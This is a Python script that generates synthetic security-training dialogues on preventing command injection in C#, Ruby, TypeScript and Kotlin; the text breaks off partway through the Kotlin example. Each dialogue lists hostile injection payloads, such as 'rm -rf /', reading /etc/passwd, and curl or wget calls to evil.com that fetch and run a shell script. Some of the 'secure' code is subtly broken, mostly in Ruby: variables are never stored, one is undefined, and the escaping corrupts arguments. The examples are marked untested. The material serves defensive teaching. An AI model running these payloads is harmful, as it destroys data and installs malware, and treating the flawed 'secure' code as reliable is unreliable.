#!/usr/bin/env python3
"""
Expand Command Injection Batch 002 from 5 to 10 examples.
Adds examples 021-025 with diverse language coverage.
"""

import json
from pathlib import Path
from datetime import date


def create_base_metadata(language, example_num):
    """Create base metadata for command injection examples."""
    return {
        "lang": language,
        "category": "injection",
        "subcategory": "command_injection",
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-78",
        "severity": "CRITICAL",
        "complexity": "moderate",
        "created": str(date.today()),
        "validated": False
    }


def example_021_csharp_process():
    """C# Process.Start - Command Injection Prevention"""

    user_turn_1 = "I'm using C# to run system commands with Process.Start. How do I prevent command injection?"

    assistant_turn_1 = """I'll demonstrate vulnerable patterns and secure process execution in C#.

**VULNERABLE CODE - DO NOT USE:**

```csharp
using System.Diagnostics;

public class FileConverter
{
    // DANGER: String concatenation in command
    public void ConvertFile(string inputFile, string outputFormat)
    {
        string command = $"ffmpeg -i {inputFile} output.{outputFormat}";

        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + command;
        process.StartInfo.UseShellExecute = false;
        process.Start();
        process.WaitForExit();
    }

    // DANGER: Direct user input in command
    public string RunCustomCommand(string userCommand)
    {
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + userCommand;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.UseShellExecute = false;

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        return output;
    }
}
```

**Attack Payloads:**

```
inputFile: file.mp4 && del /Q C:\\Users\\*.*
outputFormat: mp4 & net user hacker password123 /add
userCommand: dir & whoami & ipconfig /all
```

**SECURE IMPLEMENTATION:**

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;

public class SecureFileConverter
{
    private static readonly string[] AllowedFormats = { "mp4", "avi", "mkv", "webm" };

    public void ConvertFileSafe(string inputFile, string outputFormat)
    {
        // Validate input file exists and is safe
        if (!ValidateFilePath(inputFile))
        {
            throw new ArgumentException("Invalid input file path");
        }

        // Validate output format against allowlist
        if (!AllowedFormats.Contains(outputFormat.ToLower()))
        {
            throw new ArgumentException("Invalid output format");
        }

        // Use ArgumentList instead of Arguments (no shell interpretation)
        Process process = new Process();
        process.StartInfo.FileName = "ffmpeg";
        process.StartInfo.ArgumentList.Add("-i");
        process.StartInfo.ArgumentList.Add(inputFile);
        process.StartInfo.ArgumentList.Add($"output.{outputFormat}");
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;

        process.Start();
        process.WaitForExit();
    }

    // Never allow arbitrary commands - use specific operations
    public string GetFileInfo(string filePath)
    {
        if (!ValidateFilePath(filePath))
        {
            throw new ArgumentException("Invalid file path");
        }

        // Use .NET APIs instead of shell commands
        FileInfo fileInfo = new FileInfo(filePath);

        return $"Size: {fileInfo.Length}, Created: {fileInfo.CreationTime}";
    }

    private bool ValidateFilePath(string path)
    {
        if (string.IsNullOrWhiteSpace(path))
            return false;

        // Check for path traversal
        string fullPath = Path.GetFullPath(path);
        string baseDir = Path.GetFullPath(AppDomain.CurrentDomain.BaseDirectory);

        if (!fullPath.StartsWith(baseDir))
            return false;

        // Check for dangerous characters
        if (Regex.IsMatch(path, @"[;&|<>$`\\n\\r]"))
            return false;

        return File.Exists(fullPath);
    }
}
```

**Key Security Principles:**

1. **ArgumentList**: No shell interpretation (C# 2.1+)
2. **No cmd.exe**: Execute binaries directly
3. **Input Validation**: Allowlists for formats, paths
4. **Path Validation**: Prevent traversal attacks
5. **Use .NET APIs**: Prefer built-in methods over shell commands
"""

    user_turn_2 = "What if I need to run commands with specific environment variables or working directories?"

    assistant_turn_2 = """For advanced process configuration, use ProcessStartInfo with strict validation:

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

public class SecureProcessExecutor
{
    private readonly string _allowedExecutablesPath;
    private static readonly HashSet<string> AllowedExecutables = new HashSet<string>
    {
        "ffmpeg", "imagemagick", "convert", "git"
    };

    public SecureProcessExecutor(string allowedPath)
    {
        _allowedExecutablesPath = Path.GetFullPath(allowedPath);
    }

    public ProcessResult ExecuteCommand(
        string executable,
        List<string> arguments,
        Dictionary<string, string> environmentVars = null,
        string workingDirectory = null)
    {
        // Validate executable
        if (!ValidateExecutable(executable))
        {
            throw new SecurityException($"Executable '{executable}' not allowed");
        }

        // Validate working directory
        if (workingDirectory != null && !ValidateWorkingDirectory(workingDirectory))
        {
            throw new SecurityException("Invalid working directory");
        }

        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = Path.Combine(_allowedExecutablesPath, executable),
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true
        };

        // Add arguments safely (no shell interpretation)
        foreach (var arg in arguments)
        {
            if (ValidateArgument(arg))
            {
                startInfo.ArgumentList.Add(arg);
            }
            else
            {
                throw new SecurityException($"Invalid argument: {arg}");
            }
        }

        // Set working directory if provided
        if (workingDirectory != null)
        {
            startInfo.WorkingDirectory = workingDirectory;
        }

        // Add environment variables safely
        if (environmentVars != null)
        {
            foreach (var kvp in environmentVars)
            {
                if (ValidateEnvironmentVariable(kvp.Key, kvp.Value))
                {
                    startInfo.EnvironmentVariables[kvp.Key] = kvp.Value;
                }
            }
        }

        // Execute with timeout
        using (Process process = new Process { StartInfo = startInfo })
        {
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            bool completed = process.WaitForExit(30000); // 30 second timeout

            if (!completed)
            {
                process.Kill();
                throw new TimeoutException("Process exceeded timeout");
            }

            return new ProcessResult
            {
                ExitCode = process.ExitCode,
                Output = output,
                Error = error
            };
        }
    }

    private bool ValidateExecutable(string executable)
    {
        // Check against allowlist
        if (!AllowedExecutables.Contains(executable.ToLower()))
            return false;

        // Check for path traversal attempts
        if (executable.Contains("..") || executable.Contains("/") || executable.Contains("\\\\"))
            return false;

        // Verify executable exists
        string fullPath = Path.Combine(_allowedExecutablesPath, executable);
        return File.Exists(fullPath);
    }

    private bool ValidateArgument(string argument)
    {
        if (string.IsNullOrWhiteSpace(argument))
            return false;

        // Block dangerous characters
        char[] dangerousChars = { ';', '&', '|', '<', '>', '$', '`', '\\n', '\\r' };
        if (argument.IndexOfAny(dangerousChars) >= 0)
            return false;

        // Limit length
        if (argument.Length > 1000)
            return false;

        return true;
    }

    private bool ValidateWorkingDirectory(string directory)
    {
        if (string.IsNullOrWhiteSpace(directory))
            return false;

        // Must be absolute path
        if (!Path.IsPathRooted(directory))
            return false;

        // Check for path traversal
        string fullPath = Path.GetFullPath(directory);
        if (!fullPath.StartsWith(_allowedExecutablesPath))
            return false;

        return Directory.Exists(fullPath);
    }

    private bool ValidateEnvironmentVariable(string key, string value)
    {
        // Allowlist of safe environment variables
        var allowedVars = new HashSet<string> { "PATH", "TEMP", "TMP" };

        if (!allowedVars.Contains(key.ToUpper()))
            return false;

        // Validate value doesn't contain command injection attempts
        return ValidateArgument(value);
    }
}

public class ProcessResult
{
    public int ExitCode { get; set; }
    public string Output { get; set; }
    public string Error { get; set; }
}

// Usage example
public class VideoProcessingService
{
    private readonly SecureProcessExecutor _executor;

    public VideoProcessingService()
    {
        _executor = new SecureProcessExecutor("/usr/local/bin");
    }

    public void ConvertVideo(string inputPath, string outputPath, string format)
    {
        var arguments = new List<string>
        {
            "-i", inputPath,
            "-codec:v", "libx264",
            "-crf", "23",
            outputPath
        };

        var result = _executor.ExecuteCommand("ffmpeg", arguments);

        if (result.ExitCode != 0)
        {
            throw new Exception($"Conversion failed: {result.Error}");
        }
    }
}
```

**Production Best Practices:**

1. **Executable Allowlist**: Only permit specific binaries
2. **ArgumentList Property**: Prevents shell interpretation
3. **Path Validation**: Restrict to specific directories
4. **Timeout Enforcement**: Prevent resource exhaustion
5. **Environment Variable Control**: Allowlist safe variables
6. **No Shell Execution**: UseShellExecute = false always
7. **Argument Validation**: Block special characters
8. **Logging**: Log all command executions for audit

This approach provides maximum security while maintaining functionality."""

    metadata = create_base_metadata("c#", 21)

    return {
        "id": "command-injection-000021",
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata,
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_022_ruby_system():
    """Ruby system() and backticks - Command Injection Prevention"""

    user_turn_1 = "I'm using Ruby to execute system commands. How do I prevent command injection with system() and backticks?"

    assistant_turn_1 = """I'll show you dangerous Ruby patterns and secure alternatives.

**VULNERABLE CODE - DO NOT USE:**

```ruby
class FileProcessor
  # DANGER: Backticks with string interpolation
  def compress_file(filename)
    result = `gzip #{filename}`
    result
  end

  # DANGER: system() with string interpolation
  def delete_old_files(directory, days)
    system("find #{directory} -mtime +#{days} -delete")
  end

  # DANGER: exec with user input
  def run_custom_script(script_name, args)
    exec("./scripts/#{script_name} #{args}")
  end

  # DANGER: %x{} with interpolation
  def get_file_size(filename)
    size = %x{du -sh #{filename}}
    size.strip
  end
end
```

**Attack Payloads:**

```ruby
# filename: "file.txt; rm -rf /"
# directory: "/tmp && cat /etc/passwd"
# script_name: "../../../etc/passwd"
# args: "; curl evil.com/shell.sh | sh"
```

**SECURE IMPLEMENTATION:**

```ruby
class SecureFileProcessor
  ALLOWED_DIRECTORIES = ['/tmp/uploads', '/var/data'].freeze
  ALLOWED_SCRIPTS = ['backup.sh', 'cleanup.sh', 'analyze.sh'].freeze

  # Method 1: Array form (no shell interpretation)
  def compress_file_safe(filename)
    return unless validate_filename(filename)

    # Use array form - no shell interpretation
    result = system('gzip', filename)
    result
  end

  # Method 2: Use Ruby built-ins instead of shell
  def delete_old_files_safe(directory, days)
    return unless validate_directory(directory)
    return unless days.to_i > 0

    # Use Ruby's File/Dir APIs instead of shell
    cutoff_time = Time.now - (days.to_i * 24 * 60 * 60)

    Dir.glob(File.join(directory, '**', '*')).each do |file|
      next unless File.file?(file)
      next unless File.mtime(file) < cutoff_time

      begin
        File.delete(file)
      rescue => e
        Rails.logger.error("Failed to delete #{file}: #{e.message}")
      end
    end
  end

  # Method 3: Allowlist with spawn
  def run_script_safe(script_name, args_array)
    # Validate script name against allowlist
    unless ALLOWED_SCRIPTS.include?(script_name)
      raise ArgumentError, "Script not allowed: #{script_name}"
    end

    # Validate arguments
    args_array.each do |arg|
      unless safe_argument?(arg)
        raise ArgumentError, "Invalid argument: #{arg}"
      end
    end

    # Use spawn with array (no shell)
    script_path = File.join('./scripts', script_name)
    pid = spawn(script_path, *args_array)
    Process.wait(pid)

    exitstatus.success?
  end

  # Method 4: Use Ruby APIs instead of shell commands
  def get_file_size_safe(filename)
    return unless validate_filename(filename)

    # Use Ruby's File API
    File.size(filename)
  end

  private

  def validate_filename(filename)
    return false if filename.nil? || filename.empty?

    # Check for path traversal
    return false if filename.include?('..')

    # Check for shell metacharacters
    return false if filename.match?(/[;&|<>$`\\n\\r]/)

    # Verify file exists and is regular file
    return false unless File.file?(filename)

    true
  end

  def validate_directory(directory)
    return false if directory.nil? || directory.empty?

    # Must be in allowlist
    return false unless ALLOWED_DIRECTORIES.any? { |d| directory.start_with?(d) }

    # Check for path traversal
    return false if directory.include?('..')

    # Verify directory exists
    return false unless Dir.exist?(directory)

    true
  end

  def safe_argument?(arg)
    return false if arg.nil? || arg.empty?

    # Block shell metacharacters
    return false if arg.match?(/[;&|<>$`\\n\\r]/)

    # Limit length
    return false if arg.length > 255

    true
  end
end
```

**Key Security Principles:**

1. **Array Form**: system('command', 'arg1', 'arg2') - no shell
2. **Ruby Built-ins**: Prefer File, Dir, FileUtils over shell
3. **spawn**: More control than system, supports array form
4. **Allowlists**: For scripts, directories, commands
5. **Never**: Backticks, %x{}, or string form with user input
"""

    user_turn_2 = "How do I safely run commands that need piping or environment variables?"

    assistant_turn_2 = """For complex command execution, use Open3 with strict control:

```ruby
require 'open3'
require 'shellwords'

class AdvancedCommandExecutor
  ALLOWED_COMMANDS = {
    'ffmpeg' => '/usr/bin/ffmpeg',
    'imagemagick' => '/usr/bin/convert',
    'git' => '/usr/bin/git'
  }.freeze

  def initialize
    timeout = 30
  end

  # Safe command execution with Open3
  def execute_command(command_name, args, options = {})
    # Validate command
    command_path = validate_command(command_name)

    # Validate all arguments
    validated_args = args.map { |arg| validate_and_escape(arg) }

    # Prepare environment
    env = prepare_environment(options[:env] || {})

    # Execute with timeout
    stdout, stderr, status = Open3.capture3(
      env,
      command_path,
      *validated_args,
      chdir: options[:working_dir],
      timeout: timeout
    )

    {
      success: status.success?,
      exit_code: status.exitstatus,
      stdout: stdout,
      stderr: stderr
    }
  rescue Timeout::Error
    raise "Command timed out after #{timeout} seconds"
  end

  # For commands needing pipes - build safely
  def execute_pipeline(commands)
    validate_pipeline(commands)

    # Build command array
    cmd_array = commands.flat_map do |cmd|
      [validate_command(cmd[:name])] + cmd[:args].map { |a| validate_and_escape(a) }
    end

    # Execute pipeline
    stdout, stderr, status = Open3.pipeline_r(*cmd_array)

    {
      success: status.last.success?,
      stdout: stdout.read,
      stderr: stderr
    }
  end

  private

  def validate_command(name)
    path = ALLOWED_COMMANDS[name]
    raise ArgumentError, "Command not allowed: #{name}" unless path
    raise ArgumentError, "Command not found: #{path}" unless File.executable?(path)
    path
  end

  def validate_and_escape(arg)
    raise ArgumentError, "Argument cannot be nil" if arg.nil?

    # Convert to string
    arg = arg.to_s

    # Check length
    raise ArgumentError, "Argument too long" if arg.length > 1000

    # Check for dangerous characters
    if arg.match?(/[;&|<>$`\\n\\r]/)
      raise ArgumentError, "Argument contains dangerous characters"
    end

    # Use Shellwords for additional safety (though array form doesn't need it)
    Shellwords.escape(arg)
  end

  def prepare_environment(env_vars)
    # Allowlist of safe environment variables
    allowed_vars = %w[PATH LANG LC_ALL TMPDIR]

    safe_env = {}
    env_vars.each do |key, value|
      if allowed_vars.include?(key)
        safe_env[key] = value.to_s if safe_value?(value)
      end
    end

    safe_env
  end

  def safe_value?(value)
    value.to_s.length <= 255 && !value.to_s.match?(/[;&|<>$`]/)
  end

  def validate_pipeline(commands)
    raise ArgumentError, "Pipeline too long" if commands.length > 5

    commands.each do |cmd|
      validate_command(cmd[:name])
      cmd[:args].each { |arg| validate_and_escape(arg) }
    end
  end
end

# Service class for video processing
class VideoProcessingService
  def initialize
    executor = AdvancedCommandExecutor.new
  end

  def convert_video(input_path, output_path, format)
    validate_paths(input_path, output_path)
    validate_format(format)

    args = [
      '-i', input_path,
      '-codec:v', 'libx264',
      '-preset', 'medium',
      '-crf', '23',
      output_path
    ]

    result = executor.execute_command('ffmpeg', args, working_dir: '/tmp')

    unless result[:success]
      raise "Conversion failed: #{result[:stderr]}"
    end

    result
  end

  def batch_process(input_dir, output_dir)
    validate_directory(input_dir)
    validate_directory(output_dir)

    Dir.glob(File.join(input_dir, '*.{mp4,avi,mkv}')).each do |input_file|
      output_file = File.join(output_dir, File.basename(input_file, '.*') + '.mp4')

      begin
        convert_video(input_file, output_file, 'mp4')
      rescue => e
        Rails.logger.error("Failed to process #{input_file}: #{e.message}")
      end
    end
  end

  private

  def validate_paths(input, output)
    raise ArgumentError unless File.file?(input)
    raise ArgumentError if File.exist?(output) # Don't overwrite
    raise ArgumentError if input.include?('..') || output.include?('..')
  end

  def validate_format(format)
    allowed = %w[mp4 avi mkv webm]
    raise ArgumentError unless allowed.include?(format.downcase)
  end

  def validate_directory(dir)
    raise ArgumentError unless Dir.exist?(dir)
    raise ArgumentError if dir.include?('..')
  end
end
```

**Production Best Practices:**

1. **Open3.capture3**: Full control over stdin/stdout/stderr
2. **Array Form Always**: Never string form
3. **Environment Control**: Allowlist environment variables
4. **Timeout Enforcement**: Prevent runaway processes
5. **Shellwords.escape**: Extra safety layer
6. **Working Directory**: Set explicitly
7. **Pipeline Validation**: Check each command in pipeline
8. **Logging**: Log all command executions
9. **Error Handling**: Capture and handle errors properly

**When to Use What:**

- `system(cmd, args)`: Simple success/failure check
- `Open3.capture3`: Need stdout/stderr capture
- `spawn`: Background processes
- `Open3.pipeline_r`: Multiple commands with pipes
- **Ruby APIs**: Always prefer over shell when possible

This provides complete command injection protection while maintaining flexibility."""

    metadata = create_base_metadata("ruby", 22)

    return {
        "id": "command-injection-000022",
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata,
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_023_typescript_child_process():
    """TypeScript child_process - Command Injection Prevention"""

    user_turn_1 = "I'm using Node.js child_process to run system commands. How do I prevent command injection in TypeScript?"

    assistant_turn_1 = """I'll demonstrate vulnerable patterns and secure child_process usage.

**VULNERABLE CODE - DO NOT USE:**

```javascript
const { exec } = require('child_process');

class FileManager {
    // DANGER: Template literals in exec()
    compressFile(filename) {
        exec(`gzip ${filename}`, (error, stdout, stderr) => {
            if (error) {
                console.error(error);
                return;
            }
            console.log(stdout);
        });
    }

    // DANGER: String concatenation
    searchFiles(directory, pattern) {
        const command = 'find ' + directory + ' -name "' + pattern + '"';
        exec(command, (error, stdout) => {
            if (error) throw error;
            console.log(stdout);
        });
    }

    // DANGER: User input in shell command
    runCustomCommand(userInput) {
        exec(userInput, (error, stdout) => {
            if (error) throw error;
            return stdout;
        });
    }
}
```

**Attack Payloads:**

```
filename: "file.txt; rm -rf /"
directory: "/tmp && cat /etc/passwd"
pattern: "*.txt\" && curl evil.com/shell.sh | sh"
userInput: "ls; wget http://evil.com/malware"
```

**SECURE IMPLEMENTATION:**

```javascript
const { execFile, spawn } = require('child_process');
const path = require('path');
const fs = require('fs').promises;

class SecureFileManager {
    private readonly allowedCommands = new Set([
        'gzip', 'ffmpeg', 'convert', 'git'
    ]);

    // Method 1: execFile (no shell, array arguments)
    async compressFileSafe(filename) {
        // Validate filename
        if (!this.validateFilename(filename)) {
            throw new Error('Invalid filename');
        }

        return new Promise((resolve, reject) => {
            execFile('gzip', [filename], (error, stdout, stderr) => {
                if (error) {
                    reject(error);
                    return;
                }
                resolve(stdout);
            });
        });
    }

    // Method 2: Use Node.js APIs instead of shell
    async searchFilesSafe(directory, pattern) {
        if (!this.validateDirectory(directory)) {
            throw new Error('Invalid directory');
        }

        // Use Node.js fs module instead of shell find
        const files = await fs.readdir(directory, { recursive: true });
        const matching = files.filter(file =>
            file.includes(pattern) && this.safePattern(pattern)
        );

        return matching;
    }

    // Method 3: spawn with array arguments
    async runCommandSafe(commandName, args) {
        // Validate command against allowlist
        if (!this.allowedCommands.has(commandName)) {
            throw new Error(`Command not allowed: ${commandName}`);
        }

        // Validate all arguments
        const validArgs = args.map(arg => this.validateArgument(arg));

        return new Promise((resolve, reject) => {
            const child = spawn(commandName, validArgs, {
                timeout: 30000,
                shell: false // CRITICAL: No shell interpretation
            });

            let stdout = '';
            let stderr = '';

            child.stdout.on('data', data => stdout += data);
            child.stderr.on('data', data => stderr += data);

            child.on('close', code => {
                if (code === 0) {
                    resolve(stdout);
                } else {
                    reject(new Error(`Command failed: ${stderr}`));
                }
            });

            child.on('error', reject);
        });
    }

    private validateFilename(filename) {
        if (!filename || typeof filename !== 'string') return false;

        // Check for path traversal
        if (filename.includes('..')) return false;

        // Check for shell metacharacters
        const dangerous = /[;&|<>$`\\n\\r]/;
        if (dangerous.test(filename)) return false;

        // Must be relative path
        if (path.isAbsolute(filename)) return false;

        return true;
    }

    private validateDirectory(directory) {
        if (!directory || typeof directory !== 'string') return false;

        // Must be absolute path
        if (!path.isAbsolute(directory)) return false;

        // No path traversal
        if (directory.includes('..')) return false;

        return true;
    }

    private validateArgument(arg) {
        if (typeof arg !== 'string') {
            throw new Error('Argument must be string');
        }

        if (arg.length > 1000) {
            throw new Error('Argument too long');
        }

        // Block shell metacharacters
        const dangerous = /[;&|<>$`]/;
        if (dangerous.test(arg)) {
            throw new Error('Argument contains dangerous characters');
        }

        return arg;
    }

    private safePattern(pattern) {
        // Only allow alphanumeric, dots, and asterisks
        return /^[a-zA-Z0-9.*_-]+$/.test(pattern);
    }
}
```

**Key Security Principles:**

1. **execFile over exec**: No shell interpretation
2. **spawn with shell: false**: Maximum control
3. **Array Arguments**: Never string commands
4. **Node.js APIs**: Prefer fs, path over shell
5. **Command Allowlist**: Only permit specific binaries
6. **Argument Validation**: Block special characters
"""

    user_turn_2 = "How do I handle complex command execution with environment variables and timeouts?"

    assistant_turn_2 = """For advanced command execution, create a secure wrapper service:

```javascript
const { spawn } = require('child_process');
const path = require('path');

interface CommandOptions {
    args: string[];
    env?: Record<string, string>;
    cwd?: string;
    timeout?: number;
}

interface CommandResult {
    success: boolean;
    exitCode: number;
    stdout: string;
    stderr: string;
}

class SecureCommandExecutor {
    private readonly allowedCommands: Map<string, string> = new Map([
        ['ffmpeg', '/usr/bin/ffmpeg'],
        ['convert', '/usr/bin/convert'],
        ['git', '/usr/bin/git']
    ]);

    private readonly allowedEnvVars = new Set([
        'PATH', 'LANG', 'LC_ALL', 'TMPDIR'
    ]);

    async execute(
        command: string,
        options: CommandOptions
    ): Promise<CommandResult> {
        // Validate command
        const commandPath = this.validateCommand(command);

        // Validate arguments
        const validArgs = options.args.map(arg => this.validateArgument(arg));

        // Prepare safe environment
        const env = this.prepareSafeEnvironment(options.env);

        // Validate working directory
        const cwd = options.cwd ? this.validateWorkingDirectory(options.cwd) : undefined;

        // Set timeout
        const timeout = Math.min(options.timeout || 30000, 60000);

        return this.spawnProcess(commandPath, validArgs, { env, cwd, timeout });
    }

    private async spawnProcess(
        command: string,
        args: string[],
        options: { env?: Record<string, string>; cwd?: string; timeout: number }
    ): Promise<CommandResult> {
        return new Promise((resolve, reject) => {
            const child = spawn(command, args, {
                ...options,
                shell: false,
                stdio: ['ignore', 'pipe', 'pipe']
            });

            let stdout = '';
            let stderr = '';
            let killed = false;

            // Set timeout
            const timer = setTimeout(() => {
                killed = true;
                child.kill('SIGTERM');
            }, options.timeout);

            child.stdout.on('data', data => {
                stdout += data.toString();
                // Prevent stdout buffer overflow
                if (stdout.length > 1024 * 1024) { // 1MB limit
                    child.kill('SIGTERM');
                    reject(new Error('Output too large'));
                }
            });

            child.stderr.on('data', data => {
                stderr += data.toString();
                if (stderr.length > 1024 * 1024) {
                    child.kill('SIGTERM');
                    reject(new Error('Error output too large'));
                }
            });

            child.on('close', code => {
                clearTimeout(timer);

                if (killed) {
                    reject(new Error('Process killed: timeout exceeded'));
                    return;
                }

                resolve({
                    success: code === 0,
                    exitCode: code || -1,
                    stdout,
                    stderr
                });
            });

            child.on('error', error => {
                clearTimeout(timer);
                reject(error);
            });
        });
    }

    private validateCommand(command: string): string {
        const commandPath = this.allowedCommands.get(command);

        if (!commandPath) {
            throw new Error(`Command not allowed: ${command}`);
        }

        // Verify executable exists (in production, check file system)
        return commandPath;
    }

    private validateArgument(arg: string): string {
        if (typeof arg !== 'string') {
            throw new Error('Argument must be string');
        }

        if (arg.length > 2000) {
            throw new Error('Argument too long');
        }

        // Block shell metacharacters
        const dangerous = /[;&|<>$`\\n\\r]/;
        if (dangerous.test(arg)) {
            throw new Error(`Dangerous characters in argument: ${arg}`);
        }

        return arg;
    }

    private prepareSafeEnvironment(
        userEnv?: Record<string, string>
    ): Record<string, string> {
        const safeEnv: Record<string, string> = {};

        // Start with minimal safe environment
        safeEnv.PATH = '/usr/local/bin:/usr/bin:/bin';

        // Add user-provided variables if safe
        if (userEnv) {
            for (const [key, value] of Object.entries(userEnv)) {
                if (this.allowedEnvVars.has(key) && this.safeEnvValue(value)) {
                    safeEnv[key] = value;
                }
            }
        }

        return safeEnv;
    }

    private safeEnvValue(value: string): boolean {
        if (typeof value !== 'string') return false;
        if (value.length > 1000) return false;

        // Block shell metacharacters
        const dangerous = /[;&|<>$`]/;
        return !dangerous.test(value);
    }

    private validateWorkingDirectory(dir: string): string {
        if (!path.isAbsolute(dir)) {
            throw new Error('Working directory must be absolute path');
        }

        if (dir.includes('..')) {
            throw new Error('Path traversal not allowed');
        }

        // In production, verify directory exists
        return dir;
    }
}

// Service for video processing
class VideoProcessingService {
    private executor: SecureCommandExecutor;

    constructor() {
        this.executor = new SecureCommandExecutor();
    }

    async convertVideo(
        inputPath: string,
        outputPath: string,
        format: string
    ): Promise<void> {
        this.validatePaths(inputPath, outputPath);
        this.validateFormat(format);

        const args = [
            '-i', inputPath,
            '-codec:v', 'libx264',
            '-preset', 'medium',
            '-crf', '23',
            outputPath
        ];

        const result = await this.executor.execute('ffmpeg', {
            args,
            timeout: 300000, // 5 minutes
            cwd: '/tmp'
        });

        if (!result.success) {
            throw new Error(`Conversion failed: ${result.stderr}`);
        }
    }

    private validatePaths(input: string, output: string): void {
        // Validate inputs exist and are safe
        if (!input || !output) {
            throw new Error('Invalid paths');
        }

        if (input.includes('..') || output.includes('..')) {
            throw new Error('Path traversal not allowed');
        }
    }

    private validateFormat(format: string): void {
        const allowed = ['mp4', 'avi', 'mkv', 'webm'];
        if (!allowed.includes(format.toLowerCase())) {
            throw new Error(`Invalid format: ${format}`);
        }
    }
}

// Export for use
export { SecureCommandExecutor, VideoProcessingService };
```

**Production Best Practices:**

1. **spawn over exec**: No shell interpretation
2. **shell: false**: CRITICAL security setting
3. **Timeout Enforcement**: Kill runaway processes
4. **Output Limits**: Prevent memory exhaustion
5. **Environment Control**: Minimal safe environment
6. **Working Directory**: Validate and restrict
7. **Error Handling**: Proper cleanup and logging
8. **Type Safety**: TypeScript interfaces for contracts

**Security Checklist:**

- Never use `exec()` or `execSync()` with user input
- Always use `execFile()` or `spawn()` with `shell: false`
- Pass arguments as arrays, never in command string
- Validate all inputs against allowlists
- Set timeouts on all processes
- Limit output buffer sizes
- Log all command executions for audit
- Use Node.js APIs when possible instead of shell commands

This provides complete command injection protection for Node.js/TypeScript applications."""

    metadata = create_base_metadata("typescript", 23)

    return {
        "id": "command-injection-000023",
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata,
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_024_kotlin_processbuilder():
    """Kotlin ProcessBuilder - Command Injection Prevention"""

    user_turn_1 = "I'm using Kotlin to execute system commands with ProcessBuilder. How do I prevent command injection?"

    assistant_turn_1 = """I'll demonstrate vulnerable patterns and secure ProcessBuilder usage in Kotlin.

**VULNERABLE CODE - DO NOT USE:**

```kotlin
import java.io.BufferedReader

class FileConverter {
    // DANGER: String interpolation in Runtime.exec()
    fun compressFile(filename: String): String {
        val command = "gzip $filename"
        val process = Runtime.getRuntime().exec(command)
        return process.inputStream.bufferedReader().readText()
    }

    // DANGER: String concatenation
    fun searchFiles(directory: String, pattern: String): List<String> {
        val command = "find $directory -name $pattern"
        val process = Runtime.getRuntime().exec(command)
        return process.inputStream.bufferedReader().readLines()
    }

    // DANGER: Building command string
    fun convertVideo(input: String, output: String, format: String) {
        val cmd = "ffmpeg -i $input -codec:v libx264 $output.$format"
        Runtime.getRuntime().exec(cmd)
    }
}
```

**Attack Payloads:**

```kotlin
// filename: "file.txt; rm -rf /"
// directory: "/tmp && cat /etc/passwd"
// input: "video.mp4; wget http://evil.com/malware"
```

**SECURE IMPLEMENTATION:**

```kotlin
import java.io.File
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.util.concurrent.TimeUnit

class SecureFileConverter {
    companion object {
        val ALLOWED_COMMANDS = setOf("gzip", "ffmpeg", "convert", "git")
        val ALLOWED_FORMATS = setOf("mp4", "avi", "mkv", "webm")
        const val COMMAND_TIMEOUT = 30L // seconds
    }

    // Method 1: ProcessBuilder with list (no shell interpretation)
    fun compressFileSafe(filename: String): ProcessResult {
        validateFilename(filename)

        val process = ProcessBuilder("gzip", filename)
            .redirectErrorStream(true)
            .start()

        val success = process.waitFor(COMMAND_TIMEOUT, TimeUnit.SECONDS)

        return if (success && process.exitValue() == 0) {
            ProcessResult(true, process.inputStream.bufferedReader().readText())
        } else {
            if (!success) process.destroyForcibly()
            ProcessResult(false, "Compression failed")
        }
    }

    // Method 2: Use Kotlin/Java APIs instead of shell
    fun searchFilesSafe(directory: String, pattern: String): List<Path> {
        validateDirectory(directory)
        validatePattern(pattern)

        // Use Files.walk instead of shell find
        return Files.walk(Paths.get(directory))
            .filter { Files.isRegularFile(it) }
            .filter { it.fileName.toString().contains(pattern) }
            .toList()
    }

    // Method 3: Array-based command with validation
    fun convertVideoSafe(input: String, output: String, format: String): ProcessResult {
        validateFilePath(input)
        validateFilePath(output)
        validateFormat(format)

        // Build command as list (no shell interpretation)
        val command = listOf(
            "ffmpeg",
            "-i", input,
            "-codec:v", "libx264",
            "-preset", "medium",
            "-crf", "23",
            "$output.$format"
        )

        val process = ProcessBuilder(command)
            .directory(File("/tmp"))
